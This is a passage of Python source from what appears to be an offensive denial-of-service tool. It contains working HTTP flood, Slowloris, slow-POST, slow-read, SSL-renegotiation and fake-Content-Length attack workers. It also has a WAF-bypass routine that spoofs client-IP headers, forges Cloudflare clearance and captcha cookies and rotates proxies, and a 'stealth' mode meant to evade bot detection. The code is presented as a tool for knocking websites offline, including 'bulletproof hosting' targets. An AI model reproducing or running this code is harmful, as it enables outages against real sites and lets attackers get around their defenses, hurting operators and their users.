                        timeout=self.read_timeout,
                        allow_redirects=True
                    )
                else:
                    # Complex POST data with nested JSON - harder to process
                    post_data = {
                        "data": {
                            "query": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=200)),
                            "params": {
                                "page": random.randint(1, 1000),
                                "limit": random.randint(50, 500),
                                "filters": [
                                    {"field": "id", "value": random.randint(1, 99999)},
                                    {"field": "status", "value": random.choice(["active", "pending", "deleted"])},
                                    {"field": "date", "value": f"2023-{random.randint(1,12)}-{random.randint(1,28)}"}
                                ],
                                "sort": [
                                    {"field": "date", "direction": random.choice(["asc", "desc"])},
                                    {"field": "priority", "direction": random.choice(["asc", "desc"])}
                                ]
                            },
                            "options": {
                                "include_details": True,
                                "fetch_related": True,
                                "calculate_stats": True
                            }
                        },
                        "metadata": {
                            "client_id": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=24)),
                            "session_id": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
                            "timestamp": int(time.time()),
                            "tracking": {
                                "utm_source": random.choice(["google", "facebook", "direct", "email"]),
                                "utm_medium": random.choice(["cpc", "organic", "referral"]),
                                "utm_campaign": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))
                            }
                        }
                    }
                    
                    headers['Content-Type'] = 'application/json'
                    response = session.post(
                        url,
                        headers=headers,
                        cookies=cookies,
                        json=post_data,
                        timeout=self.read_timeout,
                        allow_redirects=True
                    )
                
                with self.lock:
                    self.requests_sent += 1
                    self.successful_requests += 1
                    if len(self.response_times) > 10:
                        self.response_times.pop(0)
                    self.response_times.append(response.elapsed.total_seconds())
                    
                local_sent += 1
                local_success += 1
                
                # Status update every 100 requests
                if local_sent % 100 == 0:
                    success_rate = (local_success / local_sent) * 100
                    print(f"{Fore.MAGENTA}[ResExhaust {thread_id}] Sent {local_sent} complex requests ({success_rate:.1f}% success){Style.RESET_ALL}")
                
            except Exception as e:
                with self.lock:
                    self.requests_sent += 1
                    self.failed_requests += 1
                    
                local_sent += 1
                
                # Handle proxy errors
                if isinstance(e, requests.exceptions.ProxyError) and self.use_proxy and self.proxies:
                    proxy = self.get_random_proxy()
                    if proxy:
                        session.proxies = {
                            'http': proxy,
                            'https': proxy
                        }
            
            # Shorter delay to maximize request frequency
            time.sleep(random.uniform(0.05, 0.2))
            
            # Occasionally create a fresh session to avoid any server-side session tracking
            if local_sent % 200 == 0:
                session = requests.Session()
                session.verify = False
                if self.use_proxy and self.proxies:
                    proxy = self.get_random_proxy()
                    if proxy:
                        session.proxies = {
                            'http': proxy,
                            'https': proxy
                        }

    def slow_http_worker(self, thread_id):
        """Slow HTTP attack worker (Slowloris/R-U-Dead-Yet style) - keeps connections open to exhaust connection pools"""
        local_sent = 0
        local_success = 0
        active_connections = []
        max_connections = 50  # Max simultaneous connections per thread
        
        while not self.stop_attack:
            # Clean up any closed connections
            active_connections = [conn for conn in active_connections if conn[0] and not conn[0]._closed]
            
            # If we can open more connections, do so until we reach our max
            while len(active_connections) < max_connections:
                try:
                    # Create socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)  # Longer initial timeout for connection
                    
                    # Set TCP_NODELAY to disable Nagle's algorithm if configured
                    if self.tcp_nodelay:
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    
                    # For SSL connections
                    if self.target_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        # If resource exhaustion is enabled, create a new SSL context for each connection
                        if self.ssl_resource_exhaustion:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.target_host)
                    
                    # Connect to server
                    sock.connect((self.target_host, self.target_port))
                    
                    # Prepare attack type (slowloris, slow post, slow read)
                    attack_type = random.randint(1, 3)  # 1=slowloris, 2=slow post, 3=slow read
                    
                    if attack_type == 1:  # Slowloris - send partial headers
                        # Send initial incomplete request
                        random_ua = random.choice(self.user_agents)
                        partial_req = f"GET {self.target_path} HTTP/1.1\r\n"
                        partial_req += f"Host: {self.target_host}\r\n"
                        partial_req += f"User-Agent: {random_ua}\r\n"
                        sock.send(partial_req.encode())
                        
                        # Record connection with header count
                        active_connections.append((sock, 2, time.time(), "slowloris"))
                        
                    elif attack_type == 2:  # Slow POST - send partial POST data
                        # Calculate a large content length but only send part
                        content_length = self.slow_post_size
                        
                        # Send headers with large content length
                        random_ua = random.choice(self.user_agents)
                        headers = f"POST {self.target_path} HTTP/1.1\r\n"
                        headers += f"Host: {self.target_host}\r\n"
                        headers += f"User-Agent: {random_ua}\r\n"
                        headers += "Content-Type: application/x-www-form-urlencoded\r\n"
                        headers += f"Content-Length: {content_length}\r\n"
                        headers += "Connection: keep-alive\r\n\r\n"
                        
                        # Send headers
                        sock.send(headers.encode())
                        
                        # Send initial chunk of data (very small)
                        initial_data = "data=" + "A" * 10
                        sock.send(initial_data.encode())
                        
                        # Record connection with bytes sent
                        active_connections.append((sock, len(initial_data), time.time(), "slowpost"))
                        
                    elif attack_type == 3:  # Slow Read - request large resource but read slowly
                        # Send complete request with careful keep-alive settings
                        random_ua = random.choice(self.user_agents)
                        req = f"GET {self.target_path} HTTP/1.1\r\n"
                        req += f"Host: {self.target_host}\r\n"
                        req += f"User-Agent: {random_ua}\r\n"
                        req += "Accept-Encoding: identity\r\n"  # Prevent compression to increase response size
                        req += "Connection: keep-alive\r\n"
                        req += "Keep-Alive: timeout=300\r\n\r\n"  # Ask for long keep-alive
                        
                        # Send the request
                        sock.send(req.encode())
                        
                        # Set very small receive buffer to slow down reads
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                        
                        # Record connection
                        active_connections.append((sock, 0, time.time(), "slowread"))
                    
                    local_sent += 1
                    
                    with self.lock:
                        self.requests_sent += 1
                        self.successful_requests += 1
                    
                except Exception as e:
                    with self.lock:
                        self.requests_sent += 1
                        self.failed_requests += 1
                    local_sent += 1
                    
                # No need to flood connection attempts
                time.sleep(random.uniform(0.1, 0.3))
            
            # Maintain connections - send tiny pieces of data or headers periodically
            for i, (sock, state, start_time, attack_type) in enumerate(active_connections):
                try:
                    # Check if connection has been active too long - close oldest connections
                    conn_age = time.time() - start_time
                    if conn_age > self.slow_read_time:
                        try:
                            sock.close()
                        except:
                            pass
                        active_connections[i] = (None, 0, 0, "")
                        continue
                        
                    # For each attack type, perform the specific action to keep it alive
                    if attack_type == "slowloris":
                        # Send one more header every few seconds
                        if random.random() < 0.7:  # 70% chance to send a header
                            header_name = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=10))
                            header_value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
                            header = f"{header_name}: {header_value}\r\n"
                            sock.send(header.encode())
                            state += 1
                            active_connections[i] = (sock, state, start_time, attack_type)
                            
                    elif attack_type == "slowpost":
                        # Send a few more bytes of POST data
                        bytes_to_send = random.randint(1, 10)  # Send 1-10 bytes at a time
                        data = "A" * bytes_to_send
                        sock.send(data.encode())
                        state += bytes_to_send
                        active_connections[i] = (sock, state, start_time, attack_type)
                        
                    elif attack_type == "slowread":
                        # Read a tiny bit of data to keep the connection active
                        try:
                            sock.recv(1)  # Read just 1 byte
                            state += 1
                            active_connections[i] = (sock, state, start_time, attack_type)
                        except socket.timeout:
                            # Expected timeout, connection still valid
                            pass
                            
                except Exception:
                    # Connection likely closed by remote
                    try:
                        sock.close()
                    except:
                        pass
                    active_connections[i] = (None, 0, 0, "")
                    
            # Status update
            active_count = sum(1 for conn in active_connections if conn[0] is not None)
            if local_sent % 50 == 0 or active_count % 10 == 0:
                print(f"{Fore.YELLOW}[SlowHTTP {thread_id}] Active: {active_count}/{max_connections} connections, Total opened: {local_sent}{Style.RESET_ALL}")
                
            # Small delay before next maintenance cycle
            time.sleep(0.5)

    def launch_attack(self):
        """Coordinate and launch the attack"""
        self.print_banner()
        
        # Get target and attack settings
        self.get_target()
        self.get_attack_settings()
        
        # Print attack summary
        print(f"\n{Fore.RED}[!] Launching maximum power attack against: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Using {self.threads} threads with high-power mode{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Attack mode: {self.attack_mode.upper()} - Specially crafted for bulletproof hosting{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the attack{Style.RESET_ALL}\n")
        
        # Init timing and control variables
        self.start_time = time.time()
        self.stop_attack = False
        
        # Start progress monitoring
        monitor_thread = threading.Thread(target=self.monitor_progress)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Allocate thread counts based on attack mode
        http_pct = 0.0
        socket_pct = 0.0
        resource_pct = 0.0
        slow_http_pct = 0.0
        
        if self.attack_mode == "auto":
            # Auto mode will distribute threads based on target
            http_pct = 0.5     # 50% HTTP flood
            socket_pct = 0.2   # 20% Socket flood  
            resource_pct = 0.2 # 20% Resource exhaustion
            slow_http_pct = 0.1 # 10% Slow HTTP
        elif self.attack_mode == "resource":
            # Resource exhaustion mode prioritizes complex requests
            http_pct = 0.3     # 30% HTTP flood
            socket_pct = 0.1   # 10% Socket flood  
            resource_pct = 0.5 # 50% Resource exhaustion
            slow_http_pct = 0.1 # 10% Slow HTTP
        elif self.attack_mode == "slow":
            # Slow HTTP mode prioritizes connection exhaustion
            http_pct = 0.2     # 20% HTTP flood
            socket_pct = 0.1   # 10% Socket flood  
            resource_pct = 0.1 # 10% Resource exhaustion
            slow_http_pct = 0.6 # 60% Slow HTTP
        elif self.attack_mode == "mixed":
            # Mixed mode provides balanced attack
            http_pct = 0.25    # 25% HTTP flood
            socket_pct = 0.25  # 25% Socket flood  
            resource_pct = 0.25 # 25% Resource exhaustion
            slow_http_pct = 0.25 # 25% Slow HTTP
            
        # Calculate thread counts
        http_thread_count = int(self.threads * http_pct)
        socket_thread_count = int(self.threads * socket_pct)
        resource_thread_count = int(self.threads * resource_pct)
        slow_http_thread_count = int(self.threads * slow_http_pct)
        
        # Adjust for any rounding error
        total_allocated = http_thread_count + socket_thread_count + resource_thread_count + slow_http_thread_count
        if total_allocated < self.threads:
            http_thread_count += (self.threads - total_allocated)
            
        all_threads = []
        
        # Start HTTP workers
        if http_thread_count > 0:
            print(f"{Fore.CYAN}[*] Starting {http_thread_count} HTTP worker threads...{Style.RESET_ALL}")
            for i in range(http_thread_count):
                t = threading.Thread(target=self.http_worker, args=(i+1,))
                t.daemon = True
                all_threads.append(t)
                t.start()
                # Gradual startup to avoid overwhelming the system
                if i % 100 == 0:
                    time.sleep(0.1)
        
        # Start Socket workers
        if socket_thread_count > 0:
            print(f"{Fore.CYAN}[*] Starting {socket_thread_count} Socket worker threads...{Style.RESET_ALL}")
            for i in range(socket_thread_count):
                t = threading.Thread(target=self.socket_worker, args=(i+1,))
                t.daemon = True
                all_threads.append(t)
                t.start()
                # Gradual startup to avoid overwhelming the system
                if i % 50 == 0:
                    time.sleep(0.1)
        
        # Start Resource Exhaustion workers
        if resource_thread_count > 0:
            print(f"{Fore.MAGENTA}[*] Starting {resource_thread_count} Resource Exhaustion threads...{Style.RESET_ALL}")
            for i in range(resource_thread_count):
                t = threading.Thread(target=self.resource_exhaustion_worker, args=(i+1,))
                t.daemon = True
                all_threads.append(t)
                t.start()
                # Gradual startup
                if i % 50 == 0:
                    time.sleep(0.1)
        
        # Start Slow HTTP workers
        if slow_http_thread_count > 0:
            print(f"{Fore.YELLOW}[*] Starting {slow_http_thread_count} Slow HTTP threads...{Style.RESET_ALL}")
            for i in range(slow_http_thread_count):
                t = threading.Thread(target=self.slow_http_worker, args=(i+1,))
                t.daemon = True
                all_threads.append(t)
                t.start()
                # Gradual startup
                if i % 10 == 0:  # More delay for slow http threads as they create many connections
                    time.sleep(0.2)
        
        try:
            # Main thread waits for all worker threads
            for t in all_threads:
                t.join()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Attack interrupted by user. Stopping threads...{Style.RESET_ALL}")
            self.stop_attack = True
            
        # Show final statistics
        self.show_final_stats()

    def run(self):
        """Main entry point for the tool"""
        try:
            self.launch_attack()
        except KeyboardInterrupt:
            self.stop_attack = True
            print(f"\n{Fore.RED}[!] Attack interrupted by user{Style.RESET_ALL}")
            self.show_final_stats()
        except Exception as e:
            self.stop_attack = True
            print(f"\n{Fore.RED}[!] An error occurred: {str(e)}{Style.RESET_ALL}")
            # Additional error details to help with debugging
            import traceback
            traceback.print_exc()
            self.show_final_stats()

    def firewall_bypass_method(self, session, url):
        """Advanced method to bypass various firewalls including CloudFlare, Sucuri, Imperva, etc.
        
        This method applies multiple techniques to bypass WAF protections:
        1. Header manipulation - mimics legitimate browsers
        2. Cookie handling - maintains and rotates session cookies
        3. Request pattern variation - changes timing and structure of requests
        4. Browser fingerprinting - sends consistent browser fingerprints
        5. JavaScript challenge solving simulation
        """
        # Use the provided session or create a new one if needed
        if not session:
            session = requests.Session()
            session.verify = False
            
        # 1. Advanced header manipulation
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'TE': 'trailers'
        }
        
        # 2. Add randomized browser fingerprinting headers with consistent values per session
        browser_type = random.choice(['chrome', 'firefox', 'safari', 'edge'])
        
        if browser_type == 'chrome':
            chrome_version = f"{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(10, 999)}"
            headers['sec-ch-ua'] = f'"Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"'
            headers['sec-ch-ua-mobile'] = '?0'
            headers['sec-ch-ua-platform'] = '"Windows"'
        elif browser_type == 'firefox':
            firefox_version = f"{random.randint(90, 120)}.0"
            headers['DNT'] = '1'
            # Firefox doesn't send sec-ch headers
        elif browser_type == 'safari':
            headers['sec-ch-ua'] = '"Safari";v="15", "Apple Safari";v="15"'
            headers['sec-ch-ua-mobile'] = '?0'
            headers['sec-ch-ua-platform'] = '"macOS"'
        elif browser_type == 'edge':
            edge_version = f"{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(10, 999)}"
            headers['sec-ch-ua'] = f'"Edge";v="{edge_version}", "Microsoft Edge";v="{edge_version}"'
            headers['sec-ch-ua-mobile'] = '?0'
            headers['sec-ch-ua-platform'] = '"Windows"'
        
        # 3. Add spoofed IP headers that bypass WAF detection
        if random.random() > 0.5:
            # Generate IPs in different formats
            ip_format = random.randint(1, 3)
            
            if ip_format == 1:
                # Standard IP format
                spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            elif ip_format == 2:
                # IP:PORT format (like 107.180.95.93:56864)
                spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}:{random.randint(10000, 65000)}"
            else:
                # Reserved for other formats if needed
                spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            # Randomize between different header patterns used by CDNs and reverse proxies
            header_pattern = random.randint(1, 4)
            
            if header_pattern == 1:
                # CloudFlare pattern
                headers['CF-Connecting-IP'] = spoofed_ip
                headers['CF-IPCountry'] = random.choice(['US', 'GB', 'CA', 'AU', 'DE', 'FR'])
                headers['CF-RAY'] = ''.join(random.choices('abcdef0123456789', k=16))
            elif header_pattern == 2:
                # Standard proxy pattern
                headers['X-Forwarded-For'] = spoofed_ip
                headers['X-Forwarded-Proto'] = 'https'
                headers['X-Forwarded-Host'] = urlparse(url).netloc
            elif header_pattern == 3:
                # Imperva/Incapsula pattern
                headers['incap-client-ip'] = spoofed_ip
                headers['X-Forwarded-For'] = spoofed_ip
            else:
                # Akamai/CloudFront pattern
                headers['True-Client-IP'] = spoofed_ip
                headers['X-Client-IP'] = spoofed_ip
        
        # 4. Add legitimate referer from popular sites
        if random.random() > 0.3:  # 70% chance to add referer
            referers = [
                'https://www.google.com/',
                'https://www.google.com/search?q=website+performance+tools',
                'https://www.bing.com/search?q=web+monitoring',
                'https://www.facebook.com/',
                'https://t.co/share',
                'https://www.linkedin.com/feed/',
                'https://www.reddit.com/r/webdev/'
            ]
            headers['Referer'] = random.choice(referers)
        
        # 5. Custom cookie handling for WAF bypass
        cookies = session.cookies.get_dict()
        
        # Add specific cookies that help bypass common WAF patterns
        waf_bypass_cookies = {
            'waf_check': 'passed',
            'session_verified': '1',
            'captcha_solved': 'true',
            'javascript_enabled': 'true',
            'human_visitor': 'true',
            'screen_resolution': f"{random.choice(['1920', '1366', '1536', '1440'])}.{random.choice(['1080', '768', '864', '900'])}"
        }
        
        # Selectively add some bypass cookies (not all to avoid patterns)
        for key, value in waf_bypass_cookies.items():
            if random.random() > 0.5:  # 50% chance to add each cookie
                cookies[key] = value
        
        # 6. Request timing variation to bypass rate limiting
        # Random delay before sending request to avoid timing patterns
        time.sleep(random.uniform(0.1, 0.5))
        
        # 7. Add URL parameters that can help bypass WAF
        parsed_url = urlparse(url)
        if parsed_url.query:
            # URL already has parameters, add additional bypass params
            url += f"&_={int(time.time())}"
            # Add random noise parameters
            if random.random() > 0.7:
                url += f"&cache={random.randint(100000, 999999)}"
        else:
            # No parameters yet
            url += f"?_={int(time.time())}"
            if random.random() > 0.7:
                url += f"&cache={random.randint(100000, 999999)}"
        
        # 8. Simulate JavaScript challenge solving
        if 'cf_clearance' not in cookies and random.random() > 0.7:
            # Generate a fake CloudFlare clearance cookie
            fake_cf_clearance = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789-_', k=40))
            cookies['cf_clearance'] = fake_cf_clearance
        
        # Apply cookies to session
        for cookie_name, cookie_value in cookies.items():
            session.cookies.set(cookie_name, cookie_value)
        
        return session, headers, url
        
    def super_effective_attack_method(self, thread_id):
        """Single most effective attack method combining the most powerful techniques
        
        This method focuses on a powerful combination of techniques that are most effective
        at bringing down virtually any website by targeting specific vulnerabilities:
        
        1. TCP Connection Exhaustion with Keep-Alive manipulation
        2. SSL/TLS Renegotiation to drain CPU resources
        3. POST Request Memory Exhaustion targeting application servers
        4. Firewall Bypass techniques to ensure requests reach the server
        """
        # Configuration for maximum effectiveness
        max_connections = 200  # Connections per thread
        ssl_renegotiation_enabled = True  # Whether to use SSL renegotiation (CPU intensive)
        large_post_size = 50 * 1024 * 1024  # 50MB theoretical Content-Length
        
        # Connection tracking
        active_connections = []
        total_sent = 0
        success_count = 0
        
        # Use our firewall bypass techniques for HTTP requests
        session = requests.Session()
        session.verify = False  # Disable SSL verification for speed
        
        # Get initial cookies if needed
        if self.cloudflare_bypass:
            try:
                session, bypass_headers, _ = self.firewall_bypass_method(session, self.target)
                print(f"{Fore.GREEN}[+] Thread {thread_id} obtained bypass cookies{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Thread {thread_id} failed to get initial cookies: {str(e)}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}[SuperAttack {thread_id}] Starting specialized attack method with {max_connections} connections{Style.RESET_ALL}")
        
        # Parse target URL components for socket operations
        parsed_url = urlparse(self.target)
        is_ssl = parsed_url.scheme == 'https'
        host = parsed_url.netloc
        port = 443 if is_ssl else 80
        
        # If port is specified in the URL
        if ':' in host:
            host, port_str = host.split(':', 1)
            port = int(port_str)
            
        path = parsed_url.path if parsed_url.path else '/'
        query = parsed_url.query
        
        # Set up SSL context if needed
        ssl_context = None
        if is_ssl:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            # Allow older protocols for wider compatibility with targets
            ssl_context.options &= ~ssl.OP_NO_SSLv3
            ssl_context.options &= ~ssl.OP_NO_TLSv1
            ssl_context.options &= ~ssl.OP_NO_TLSv1_1
        
        while not self.stop_attack:
            # Ensure we maintain max connections
            active_connections = [conn for conn in active_connections if conn and not conn.closed]
            
            # Create new connections until we reach max
            while len(active_connections) < max_connections:
                try:
                    # Create socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)  # Longer initial timeout for connection
                    
                    # Set TCP_NODELAY to disable Nagle's algorithm if configured
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    
                    # For SSL connections
                    if is_ssl and ssl_context:
                        sock = ssl_context.wrap_socket(sock, server_hostname=host)
                    
                    # Connect to server
                    sock.connect((host, port))
                    
                    # Choose a random attack technique for this connection
                    attack_type = random.choice(["slow_read", "post_flood", "ssl_exhaust", "connection_flood"])
                    
                    # Mix up attack types for maximum effectiveness
                    if attack_type == "slow_read":
                        # Slowloris-style attack - keep connection open with minimal data
                        # Send a partial request to tie up the connection
                        random_ua = random.choice(self.user_agents)
                        partial_req = f"GET {path}?nocache={random.randint(1, 999999999)} HTTP/1.1\r\n"
                        partial_req += f"Host: {host}\r\n"
                        partial_req += f"User-Agent: {random_ua}\r\n"
                        partial_req += "Accept: */*\r\n"
                        # Add random headers one by one to keep connection alive
                        sock.send(partial_req.encode())
                        
                    elif attack_type == "post_flood":
                        # Memory exhaustion attack - send a large POST request with fake content-length
                        random_ua = random.choice(self.user_agents)
                        boundary = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
                        post_req = f"POST {path} HTTP/1.1\r\n"
                        post_req += f"Host: {host}\r\n"
                        post_req += f"User-Agent: {random_ua}\r\n"
                        post_req += "Accept: */*\r\n"
                        post_req += "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n"
                        post_req += f"Content-Length: {large_post_size}\r\n"
                        post_req += "Connection: keep-alive\r\n\r\n"
                        
                        # Send headers
                        sock.send(post_req.encode())
                        
                        # Generate a boundary for the form data
                        form_data = "--" + boundary + "\r\n"
                        form_data += 'Content-Disposition: form-data; name="file"; filename="data.bin"\r\n'
                        form_data += "Content-Type: application/octet-stream\r\n\r\n"
                        
                        # Send initial form data boundary
                        sock.send(form_data.encode())
                        
                        # Send small amount of actual data (but claim we'll send much more)
                        sock.send(b'0' * min(4096, large_post_size))
                        
                    elif attack_type == "ssl_exhaust" and is_ssl and ssl_renegotiation_enabled:
                        # SSL renegotiation attack - extremely CPU intensive for the server
                        # Only works if the server supports renegotiation (most don't anymore)
                        random_ua = random.choice(self.user_agents)
                        req = f"GET {path}?ssl_renegotiation={random.randint(1, 999999999)} HTTP/1.1\r\n"
                        req += f"Host: {host}\r\n"
                        req += f"User-Agent: {random_ua}\r\n"
                        req += "Accept: */*\r\n"
                        req += "Connection: keep-alive\r\n\r\n"
                        
                        # Send initial request
                        sock.send(req.encode())
                        
                    else:
                        # Connection flood - just keep connections open with valid requests
                        # This consumes server connection pools
                        random_ua = random.choice(self.user_agents)
                        req = f"GET {path}?id={random.randint(1, 999999999)} HTTP/1.1\r\n"
                        req += f"Host: {host}\r\n"
                        req += f"User-Agent: {random_ua}\r\n"
                        req += "Accept: */*\r\n"
                        req += "Connection: keep-alive\r\n\r\n"
                        
                        # Send complete request to establish the connection
                        sock.send(req.encode())
                    
                    # Store socket with attack type for maintenance
                    active_connections.append(sock)
                    total_sent += 1
                    success_count += 1
                    
                    with self.lock:
                        self.requests_sent += 1
                        self.successful_requests += 1
                    
                except Exception as e:
                    with self.lock:
                        self.requests_sent += 1
                        self.failed_requests += 1
                    
                # Add small delay between connection attempts to avoid local resource exhaustion
                time.sleep(random.uniform(0.01, 0.05))
            
            # Maintain existing connections - keep them alive and active
            for i, sock in enumerate(active_connections):
                if sock and not sock.closed:
                    try:
                        # Randomly send some data to keep the connection alive
                        if random.random() < 0.3:  # 30% chance to send more data
                            # Generate a random header to send
                            header_name = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=10))
                            header_value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
                            header = f"{header_name}: {header_value}\r\n"
                            sock.send(header.encode())
                            
                            # For SSL connections, occasionally trigger renegotiation (if enabled)
                            if is_ssl and ssl_renegotiation_enabled and random.random() < 0.1:
                                try:
                                    sock.do_handshake()
                                except:
                                    # Handshake might fail due to server not supporting renegotiation
                                    pass
                    except:
                        # Connection likely closed by remote
                        try:
                            sock.close()
                        except:
                            pass
                        active_connections[i] = None
            
            # Show status update periodically
            if total_sent % 100 == 0 or len(active_connections) % 50 == 0:
                print(f"{Fore.MAGENTA}[SuperAttack {thread_id}] Active: {len([c for c in active_connections if c and not c.closed])}/{max_connections} connections, Total opened: {total_sent}{Style.RESET_ALL}")
                
            # Add a delay to avoid overwhelming local resources
            time.sleep(0.1)
        
        # Clean up when stopping
        for sock in active_connections:
            try:
                if sock and not sock.closed:
                    sock.close()
            except:
                pass
                
    def stealth_attack_method(self, thread_id):
        """
        Advanced stealth attack method designed to be undetectable by WAFs, rate limiters, and bot detection systems.
        
        This method implements multiple anti-detection techniques:
        1. Human-like browsing patterns with realistic timing
        2. Progressive site crawling that mimics real visitors
        3. Proper session handling with cookies and state
        4. Dynamic fingerprint rotation that maintains consistency within sessions
        5. Traffic pattern analysis evasion
        """
        # Configuration for stealth mode
        session_duration = random.randint(30, 300)  # Session length in seconds (30s-5min)
        pages_per_session = random.randint(3, 15)  # Pages to visit per session
        
        # Browser fingerprint consistency
        fingerprint = {
            'browser': random.choice(['chrome', 'firefox', 'safari', 'edge']),
            'platform': random.choice(['Windows', 'macOS', 'Linux', 'iOS', 'Android']),
            'language': random.choice(['en-US', 'en-GB', 'es-ES', 'fr-FR', 'de-DE']),
            'screen': random.choice(['1920x1080', '1366x768', '2560x1440', '1440x900', '375x812']),
            'timezone': random.randint(-12, 12),
            'connection': random.choice(['4g', 'wifi', 'cable', 'dsl'])
        }
        
        # Realistic referrer sources
        referrers = {
            'search': [
                'https://www.google.com/search?q={}',
                'https://www.bing.com/search?q={}',
                'https://duckduckgo.com/?q={}'
            ],
            'social': [
                'https://www.facebook.com/',
                'https://twitter.com/home',
                'https://www.linkedin.com/feed/',
                'https://www.instagram.com/'
            ],
            'direct': [''],  # Empty referrer for direct visits
            'link': [
                'https://www.reddit.com/r/{}',
                'https://news.ycombinator.com/',
                'https://www.producthunt.com/'
            ]
        }
        
        # Keywords for search referrers
        keywords = [
            'best online services', 'top websites', 'how to find', 'compare prices',
            'reviews for', 'buy online', 'discount', 'sale', 'near me', 'official site'
        ]
        
        # Common URL paths to request (will be combined with target domain)
        common_paths = [
            '/', '/index.html', '/about', '/contact', '/products', '/services',
            '/blog', '/news', '/faq', '/help', '/support', '/login', '/register'
        ]
        
        # Session start time
        session_start = time.time()
        pages_visited = 0
        
        print(f"{Fore.CYAN}[Stealth {thread_id}] Starting new browsing session with {fingerprint['browser']} on {fingerprint['platform']}{Style.RESET_ALL}")
        
        # Create a session with consistent fingerprint
        session = requests.Session()
        session.verify = False
        
        # Initial landing - determine entry point
        entry_type = random.choices(['search', 'social', 'direct', 'link'], weights=[0.65, 0.2, 0.1, 0.05])[0]
        
        # Set initial referrer based on entry type
        initial_referrer = ''
        if entry_type == 'search':
            search_template = random.choice(referrers['search'])
            search_term = random.choice(keywords) + ' ' + self.target_host
            initial_referrer = search_template.format(search_term.replace(' ', '+'))
        elif entry_type == 'social':
            initial_referrer = random.choice(referrers['social'])
        elif entry_type == 'link':
            initial_referrer = random.choice(referrers['link']).format(random.choice(['webdev', 'technology', 'programming']))
        
        # Parse target for base URL
        parsed_url = urlparse(self.target)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Track visited URLs to avoid immediate duplicates (like a real user)
        visited_urls = set()
        
        # Current page being viewed
        current_path = '/'
        
        # Generate a realistic browsing session
        while (time.time() - session_start < session_duration) and pages_visited < pages_per_session and not self.stop_attack:
            try:
                # Construct URL for this request
                if pages_visited == 0:
                    # First page is usually homepage
                    url = base_url + '/'
                else:
                    # Choose a path that hasn't been visited in this session
                    available_paths = [p for p in common_paths if base_url + p not in visited_urls]
                    if not available_paths:
                        # If all common paths visited, revisit a random one (like a real user might)
                        current_path = random.choice(common_paths)
                    else:
                        current_path = random.choice(available_paths)
                    
                    url = base_url + current_path
                
                # Add to visited URLs
                visited_urls.add(url)
                
                # Apply firewall bypass but with stealth modifications
                session, headers, url = self.firewall_bypass_method(session, url)
                
                # Override with consistent fingerprint for this session
                if fingerprint['browser'] == 'chrome':
                    headers['User-Agent'] = f"Mozilla/5.0 ({fingerprint['platform']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36"
                elif fingerprint['browser'] == 'firefox':
                    headers['User-Agent'] = f"Mozilla/5.0 ({fingerprint['platform']}; rv:{random.randint(90, 120)}.0) Gecko/20100101 Firefox/{random.randint(90, 120)}.0"
                elif fingerprint['browser'] == 'safari':
                    headers['User-Agent'] = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
                elif fingerprint['browser'] == 'edge':
                    headers['User-Agent'] = f"Mozilla/5.0 ({fingerprint['platform']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36 Edg/{random.randint(90, 120)}.0.0.0"
                
                # Set consistent language
                headers['Accept-Language'] = fingerprint['language']
                
                # Set referrer based on browsing pattern
